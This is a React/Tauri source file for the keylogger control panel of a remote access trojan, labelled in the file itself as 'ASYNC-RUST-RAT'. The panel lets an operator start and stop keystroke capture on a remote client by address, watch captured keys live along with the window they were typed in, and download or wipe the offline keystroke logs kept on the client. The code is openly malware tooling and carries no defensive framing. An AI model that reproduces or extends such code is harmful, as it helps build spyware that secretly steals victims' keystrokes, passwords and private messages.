import React, { useEffect, useState, useRef } from "react";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  startKeyloggerCmd,
  stopKeyloggerCmd,
  getOfflineLogsCmd,
  clearOfflineLogsCmd,
} from "../rat/RATCommands";
import {
  IconKeyboard,
  IconPlayerPlay,
  IconPlayerStop,
  IconDownload,
  IconTrash,
  IconHistory,
  IconDeviceDesktop,
} from "@tabler/icons-react";
import { KeyloggerUpdatePayload, KeyloggerOfflineLogsPayload } from "../../types";

interface KeyEntry {
  window: string;
  data: string;
  timestamp: string;
}

export const Keylogger: React.FC = () => {
  const { addr } = useParams();
  const [realtime, setRealtime] = useState(false);
  const [logs, setLogs] = useState<KeyEntry[]>([]);
  const [offlineLogs, setOfflineLogs] = useState<string[]>([]);
  const [viewMode, setViewMode] = useState<"realtime" | "offline">("realtime");
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const unlistenUpdate = listen("keylogger_update", (event) => {
      const payload = event.payload as KeyloggerUpdatePayload;
      if (payload.addr === addr) {
        setLogs((prev) => [
          ...prev,
          {
            window: payload.window,
            data: payload.data,
            timestamp: new Date().toLocaleTimeString(),
          },
        ]);
      }
    });

    const unlistenOffline = listen("keylogger_offline_logs", (event) => {
      const payload = event.payload as KeyloggerOfflineLogsPayload;
      if (payload.addr === addr) {
        setOfflineLogs(payload.logs);
        setViewMode("offline");
      }
    });

    return () => {
      unlistenUpdate.then((fn) => fn());
      unlistenOffline.then((fn) => fn());
    };
  }, [addr]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  const handleStart = async () => {
    try {
      await startKeyloggerCmd(addr, true);
      setRealtime(true);
      setViewMode("realtime");
    } catch (e) {
      console.error(e);
    }
  };

  const handleStop = async () => {
    try {
      await stopKeyloggerCmd(addr);
      setRealtime(false);
    } catch (e) {
      console.error(e);
    }
  };

  const handleGetOffline = async () => {
    try {
      await getOfflineLogsCmd(addr);
    } catch (e) {
      console.error(e);
    }
  };

  const handleClearOffline = async () => {
    try {
      await clearOfflineLogsCmd(addr);
      setOfflineLogs([]);
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <div className="flex flex-col h-screen bg-secondarybg text-white font-sans overflow-hidden">
      {/* Header */}
      <div className="p-4 bg-primarybg border-b border-accentx flex items-center justify-between shadow-lg">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-accentx bg-opacity-20 rounded-lg">
            <IconKeyboard className="text-accentx" size={24} />
          </div>
          <div>
            <h2 className="text-lg font-bold">Keylogger</h2>
            <p className="text-xs text-gray-400">{addr}</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <div className="flex bg-secondarybg rounded-lg p-1 border border-accentx mr-2">
            <button
              onClick={() => setViewMode("realtime")}
              className={`px-3 py-1 rounded-md text-xs font-medium transition-all ${
                viewMode === "realtime"
                  ? "bg-accentx text-white shadow-md"
                  : "text-gray-400 hover:text-white"
              }`}
            >
              Real-time
            </button>
            <button
              onClick={() => setViewMode("offline")}
              className={`px-3 py-1 rounded-md text-xs font-medium transition-all ${
                viewMode === "offline"
                  ? "bg-accentx text-white shadow-md"
                  : "text-gray-400 hover:text-white"
              }`}
            >
              Offline Logs
            </button>
          </div>

          {!realtime ? (
            <button
              onClick={handleStart}
              className="flex items-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-500 rounded-lg text-sm font-bold transition-all shadow-lg active:scale-95"
            >
              <IconPlayerPlay size={18} />
              Start
            </button>
          ) : (
            <button
              onClick={handleStop}
              className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg text-sm font-bold transition-all shadow-lg active:scale-95"
            >
              <IconPlayerStop size={18} />
              Stop
            </button>
          )}
          
          <button
            onClick={handleGetOffline}
            className="p-2 bg-blue-600 hover:bg-blue-500 rounded-lg transition-all shadow-lg active:scale-95"
            title="Download Offline Logs"
          >
            <IconDownload size={20} />
          </button>
          
          <button
            onClick={handleClearOffline}
            className="p-2 bg-gray-700 hover:bg-red-600 rounded-lg transition-all shadow-lg active:scale-95"
            title="Clear Offline Logs"
          >
            <IconTrash size={20} />
          </button>
        </div>
      </div>

      {/* Main View */}
      <div className="flex-1 overflow-hidden p-4 relative">
        <div className="h-full w-full bg-black bg-opacity-40 rounded-xl border border-accentx flex flex-col overflow-hidden backdrop-blur-sm shadow-2xl">
          {/* View Container */}
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
            {viewMode === "realtime" ? (
              <div className="space-y-4">
                {logs.length === 0 && (
                  <div className="flex flex-col items-center justify-center h-64 text-gray-500">
                    <IconHistory size={48} className="opacity-20 mb-2" />
                    <p>No keystrokes recorded yet.</p>
                    <p className="text-xs">Click Start to begin real-time monitoring.</p>
                  </div>
                )}
                {logs.map((log, i) => (
                  <div key={i} className="group animate-in fade-in slide-in-from-left-2 duration-300">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[10px] font-mono text-accentx opacity-70">[{log.timestamp}]</span>
                      <div className="flex items-center gap-1 px-2 py-0.5 bg-accentx bg-opacity-10 rounded border border-accentx border-opacity-20">
                        <IconDeviceDesktop size={12} className="text-accentx" />
                        <span className="text-xs font-semibold text-accentx truncate max-w-[300px]">
                          {log.window}
                        </span>
                      </div>
                    </div>
                    <div className="pl-4 border-l border-accentx border-opacity-30">
                      <p className="text-sm font-mono text-gray-200 break-words leading-relaxed">
                        {log.data}
                      </p>
                    </div>
                  </div>
                ))}
                <div ref={logEndRef} />
              </div>
            ) : (
              <div className="space-y-2">
                {offlineLogs.length === 0 && (
                  <div className="flex flex-col items-center justify-center h-64 text-gray-500">
                    <IconDownload size={48} className="opacity-20 mb-2" />
                    <p>No offline logs loaded.</p>
                    <p className="text-xs">Click the download icon to fetch logs from the client.</p>
                  </div>
                )}
                {offlineLogs.map((log, i) => (
                  <div key={i} className="p-3 bg-white bg-opacity-5 rounded-lg border border-white border-opacity-5 hover:bg-opacity-10 transition-all font-mono text-sm">
                    {log}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
      
      {/* Footer / Status */}
      <div className="px-6 py-2 bg-primarybg border-t border-accentx flex justify-between items-center text-[10px] text-gray-500">
        <div className="flex gap-4">
          <span className="flex items-center gap-1">
            <div className={`w-1.5 h-1.5 rounded-full ${realtime ? "bg-green-500 animate-pulse" : "bg-gray-600"}`} />
            {realtime ? "MONITORING ACTIVE" : "IDLE"}
          </span>
          <span>ENTRIES: {viewMode === "realtime" ? logs.length : offlineLogs.length}</span>
        </div>
        <div className="font-mono">
          ASYNC-RUST-RAT v0.1.0 // KEYLOGGER_MODULE
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar {
          width: 6px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(0, 0, 0, 0.1);
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(var(--accent-rgb), 0.3);
          border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(var(--accent-rgb), 0.5);
        }
      `}} />
    </div>
  );
};
